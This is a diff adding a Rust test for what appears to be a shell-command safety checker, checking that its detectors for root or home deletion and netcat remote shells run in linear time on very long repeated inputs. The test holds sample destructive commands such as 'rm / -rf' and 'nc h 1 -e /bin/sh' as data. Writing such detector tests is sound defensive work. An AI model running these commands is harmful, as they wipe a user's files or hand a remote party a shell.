@@ -919,6 +919,37 @@ fn a_long_word_of_startup_files_is_read_once() {
 }
 
 #[test]
+fn commands_that_share_their_arguments_cost_one_pass() {
+    use super::destructive::removes_root_or_home;
+    use super::matchers::is_remote_shell;
+    let removals = "rm -rf ".repeat(30_000);
+    assert!(!removes_root_or_home(&removals));
+    assert!(removes_root_or_home(&format!("{removals}/")));
+    assert!(!removes_root_or_home(&format!("{removals}; /")));
+    assert!(removes_root_or_home(&format!(
+        "{}-rf /",
+        "rm ".repeat(50_000)
+    )));
+    for (line, removes) in [
+        ("rm / -rf", true),
+        ("rm -rf a ~/;", true),
+        ("rm -r a; rm /", false),
+        ("rm -r a | rm /", false),
+        ("rm a; -r /", false),
+        ("rm -rf a& /", false),
+        ("x rm -r $home", true),
+    ] {
+        assert_eq!(removes_root_or_home(line), removes, "{line}");
+    }
+    let listeners = "nc ".repeat(50_000);
+    assert!(!is_remote_shell(&listeners));
+    assert!(is_remote_shell(&format!("{listeners}-e sh")));
+    assert!(!is_remote_shell(&format!("{listeners}; echo -e sh")));
+    assert!(!is_remote_shell("nc -l 1 | sh -e"));
+    assert!(is_remote_shell("x; nc h 1 -e /bin/sh; y"));
+}
+
+#[test]
 fn substitutions_inside_one_another_cost_each_rule_little() {
     // Each of these is sixty-four substitutions that reach the end of the
     // line: none is run, so no rule reads them.
